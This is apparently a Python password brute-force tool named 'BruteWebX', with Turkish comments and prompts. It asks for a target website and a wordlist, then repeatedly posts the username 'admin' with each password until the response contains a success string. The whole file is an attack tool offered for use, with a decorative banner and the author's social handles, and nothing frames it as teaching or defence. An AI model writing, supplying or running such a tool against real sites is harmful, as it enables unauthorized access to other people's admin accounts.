import os
import time
import requests
from colorama import Fore, Style
from tqdm import tqdm

# Ekranı temizle
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Banner mesajını yazdır
def print_banner():
    banner = [
f"{Fore.MAGENTA} @@@@@                                        @@@@@",
f"{Fore.MAGENTA}@@@@@@@                                      @@@@@@@",
f"{Fore.MAGENTA}@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@",
f"{Fore.MAGENTA} @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@",
f"{Fore.MAGENTA}     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@",
f"{Fore.MAGENTA}       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@",
f"{Fore.MAGENTA}         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@",
f"{Fore.MAGENTA}            @@@@@@@    @@@@@@    @@@@@@",
f"{Fore.MAGENTA}            @@@@@@      @@@@      @@@@@",
f"{Fore.MAGENTA}            @@@@@@      @@@@      @@@@@",
f"{Fore.MAGENTA}             @@@@@@    @@@@@@    @@@@@",
f"{Fore.MAGENTA}              @@@@@@@@@@@  @@@@@@@@@@",
f"{Fore.MAGENTA}               @@@@@@@@@@  @@@@@@@@@",
f"{Fore.MAGENTA}           @@   @@@@@@@@@@@@@@@@@@@  @@",
f"{Fore.MAGENTA}           @@@@  @@@@ @ @ @ @ @@@@  @@@@",
f"{Fore.MAGENTA}          @@@@@   @@@ @ @ @ @ @@@   @@@@@",
f"{Fore.MAGENTA}        @@@@@      @@@@@@@@@@@@@      @@@@@",
f"{Fore.MAGENTA}      @@@@          @@@@@@@@@@@          @@@@",
f"{Fore.MAGENTA}   @@@@@              @@@@@@@              @@@@@",
f"{Fore.MAGENTA}  @@@@@@@                                 @@@@@@@",
f"{Fore.MAGENTA}   @@@@@                                   @@@@@",
f"{Fore.RED}██████╗░██████╗░██╗░░░██╗████████╗███████╗░██╗░░░░░░░██╗███████╗██████╗░██╗░░██╗",
f"{Fore.RED}██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝░██║░░██╗░░██║██╔════╝██╔══██╗╚██╗██╔╝",
f"{Fore.RED}██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░░╚██╗████╗██╔╝█████╗░░██████╦╝░╚███╔╝░",
f"{Fore.WHITE}██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░░░████╔═████║░██╔══╝░░██╔══██╗░██╔██╗░",
f"{Fore.WHITE}██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗░░╚██╔╝░╚██╔╝░███████╗██████╦╝██╔╝╚██╗",
f"{Fore.WHITE}╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░╚═╝░░╚═╝",
"",
f"{Fore.CYAN}===================================================",
f"{Fore.CYAN}||            {Fore.YELLOW}İnstagram: {Fore.YELLOW}@coderfenrir{Fore.CYAN}            ||",
f"{Fore.CYAN}||             {Fore.YELLOW}GitHub: {Fore.YELLOW}coderfenrir{Fore.CYAN}               ||",
f"{Fore.CYAN}===================================================",
"",
f"{Fore.GREEN}[+] Target: www.hedefsite.com/admin",
"===================================================",
"",
    ]

    for i in range(len(banner)):
        clear_screen()
        print("\n".join(banner[:i+1]))
        time.sleep(0.2)

    print(Style.RESET_ALL)

# Şifreleri alt alta göstermek ve renklendirmek için fonksiyon
def print_attempt(password):
    print(f"{Fore.CYAN}[+] Şifre deneniyor: {Fore.YELLOW}{password}{Style.RESET_ALL}")

# Admin panelini brute force ile deneyin
def brute_force(target_site, password_file):
    found = False

    if not target_site.startswith('http://') and not target_site.startswith('https://'):
        target_site = 'http://' + target_site

    try:
        response = requests.get(target_site)
        if response.status_code != 200:
            raise requests.exceptions.RequestException
    except requests.exceptions.RequestException:
        clear_screen()
        print_banner()
        print(Fore.RED + "Hedef siteye erişim sağlanamıyor. Lütfen geçerli bir URL olduğundan emin olun.")
        print(Style.RESET_ALL)
        return

    if not os.path.isfile(password_file):
        clear_screen()
        print_banner()
        print(Fore.RED + "Şifrelerin bulunduğu dosya mevcut değil. Lütfen geçerli bir dosya adı girin.")
        print(Style.RESET_ALL)
        return

    with open(password_file, 'r') as file:
        passwords = file.readlines()

    total_passwords = len(passwords)
    progress_bar = tqdm(total=total_passwords, unit="şifre")

    for password in passwords:
        password = password.strip()
        print_attempt(password)

        # Admin paneli giriş isteği
        payload = {
            'username': 'admin',
            'password': password
        }

        try:
            response = requests.post(target_site, data=payload)
            if response.status_code != 200:
                raise requests.exceptions.RequestException
        except requests.exceptions.RequestException:
            clear_screen()
            print_banner()
            print(Fore.RED + "İstek gönderilirken bir hata oluştu. Lütfen daha sonra tekrar deneyin.")
            print(Style.RESET_ALL)
            return

        # İlgili yanıtı kontrol edin
        if response.status_code == 200 and "Giriş Başarılı" in response.text:
            found = True
            break

        # 5 saniye bekleyin
        time.sleep(0.6)

        progress_bar.update(1)

    progress_bar.close()

    clear_screen()
    print_banner()

    if found:
        print(Fore.GREEN + "Pass bulundu!")
        print("Şifre: " + password)
    else:
        print(Fore.RED + "Üzgünüm, şifre bulunamadı.")

    print(Style.RESET_ALL)

# Ana işlev
def main():
    clear_screen()
    print_banner()

    target_site = input("[+] Hedef siteyi girin: ").strip()
    password_file = input("[+] Wordlist girin: ").strip()

    brute_force(target_site, password_file)

# Ana programı başlat
if __name__ == "__main__":
    main()
